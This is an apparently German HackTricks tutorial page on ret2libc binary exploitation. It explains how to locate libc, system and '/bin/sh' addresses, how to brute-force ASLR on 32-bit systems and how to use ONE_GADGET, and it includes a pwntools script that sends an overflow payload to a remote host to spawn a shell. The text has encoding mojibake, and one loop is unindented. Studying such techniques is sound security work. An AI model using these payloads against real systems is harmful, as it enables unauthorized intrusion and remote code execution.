# Ret2lib

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## **Grundlegende Informationen**

Die Essenz von **Ret2Libc** besteht darin, den Ausf√ºhrungsfluss eines anf√§lligen Programms auf eine Funktion in einer gemeinsam genutzten Bibliothek (z. B. **system**, **execve**, **strcpy**) umzuleiten, anstatt den vom Angreifer bereitgestellten Shellcode auf dem Stapel auszuf√ºhren. Der Angreifer erstellt eine Nutzlast, die die R√ºckkehradresse auf dem Stapel so √§ndert, dass sie auf die gew√ºnschte Bibliotheksfunktion zeigt, und gleichzeitig daf√ºr sorgt, dass alle erforderlichen Argumente gem√§√ü der Aufrufkonvention korrekt eingerichtet sind.

### **Beispiel-Schritte (vereinfacht)**

* Ermitteln Sie die Adresse der zu aufrufenden Funktion (z. B. system) und den auszuf√ºhrenden Befehl (z. B. /bin/sh)
* Generieren Sie eine ROP-Kette, um das erste Argument zu √ºbergeben, das auf den Befehlsstring zeigt, und den Ausf√ºhrungsfluss zur Funktion zu lenken

## Adressen finden

* Angenommen, die verwendete `libc` ist diejenige des aktuellen Rechners, k√∂nnen Sie herausfinden, wo sie im Speicher geladen wird mit:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Wenn Sie √ºberpr√ºfen m√∂chten, ob ASLR die Adresse von libc √§ndert, k√∂nnen Sie Folgendes tun:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Wenn die verwendete libc bekannt ist, ist es auch m√∂glich, den Offset zur `system`-Funktion mit dem folgenden Befehl zu finden:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Wenn die verwendete libc bekannt ist, ist es auch m√∂glich, den Offset zur Zeichenkette `/bin/sh`-Funktion mit folgendem Befehl zu finden:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Mit gdb-peda / GEF verwenden

Wenn die verwendete libc bekannt ist, ist es auch m√∂glich, Peda oder GEF zu verwenden, um die Adresse der Funktion **system**, der Funktion **exit** und des Strings **`/bin/sh`** zu erhalten:
```
p system
p exit
find "/bin/sh"
```
### Verwendung von /proc/\<PID>/maps

Wenn der Prozess jedes Mal, wenn Sie mit ihm sprechen, **Kinder** erstellt (Netzwerkserver), versuchen Sie, diese Datei zu **lesen** (wahrscheinlich m√ºssen Sie root sein).

Hier k√∂nnen Sie **genau herausfinden, wo die libc im Prozess geladen ist** und **wo sie f√ºr jedes Kind des Prozesses geladen wird**.

![](<../../../../.gitbook/assets/image (95).png>)

In diesem Fall wird sie bei **0xb75dc000** geladen (Dies wird die Basisadresse der libc sein)

## Unbekannte libc

Es k√∂nnte m√∂glich sein, dass Sie **nicht wissen, welche libc die Bin√§rdatei l√§dt** (weil sie sich auf einem Server befinden k√∂nnte, auf den Sie keinen Zugriff haben). In diesem Fall k√∂nnten Sie die Schwachstelle ausnutzen, um **einige Adressen zu leaken und herauszufinden, welche libc**-Bibliothek verwendet wird:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Und Sie k√∂nnen eine pwntools-Vorlage daf√ºr finden unter:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## Umgehung von ASLR in 32 Bit

Diese Brute-Force-Angriffe sind **nur f√ºr 32-Bit-Systeme** n√ºtzlich.

* Wenn der Exploit lokal ist, k√∂nnen Sie versuchen, die Basisadresse der libc per Brute-Force zu ermitteln (n√ºtzlich f√ºr 32-Bit-Systeme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Wenn Sie einen Remote-Server angreifen, k√∂nnten Sie versuchen, die Adresse der `libc`-Funktion `usleep` durch **Brute-Force** zu ermitteln und dabei 10 als Argument zu √ºbergeben. Wenn der Server zu einem bestimmten Zeitpunkt 10 Sekunden l√§nger braucht, um zu antworten, haben Sie die Adresse dieser Funktion gefunden.

## ONE\_GADGET

[**ONE\_GADGET**](https://github.com/david942j/one\_gadget) erm√∂glicht es, anstelle von **system** und **"/bin/sh"** eine Shell zu erhalten. **ONE\_GADGET** wird innerhalb der libc-Bibliothek einen Weg finden, um eine Shell zu erhalten, indem nur eine **ROP-Adresse** verwendet wird.\
Normalerweise gibt es jedoch einige Einschr√§nkungen, die h√§ufigsten und einfach zu umgehenden sind wie `[rsp+0x30] == NULL`. Da Sie die Werte im **RSP** kontrollieren, m√ºssen Sie nur einige weitere NULL-Werte senden, damit die Einschr√§nkung vermieden wird.

![](<../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## x86 Ret2lib Code Beispiel

In diesem Beispiel ist ASLR-Brute-Force im Code integriert und die anf√§llige Bin√§rdatei befindet sich auf einem entfernten Server:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Code Beispiel

√úberpr√ºfen Sie das Beispiel unter:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-in-printf (oder puts)

Dies erm√∂glicht das **Leaken von Informationen aus dem Prozess**, indem `printf`/`puts` mit spezifischen Daten als Argument aufgerufen wird.

## Ret2printf

Dies bedeutet im Wesentlichen, einen **Ret2lib zu missbrauchen, um ihn in eine `printf`-Formatstrings-Verwundbarkeit zu verwandeln**, indem der `ret2lib` verwendet wird, um printf mit den Werten aufzurufen, um sie auszunutzen (klingt nutzlos, ist aber m√∂glich):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}
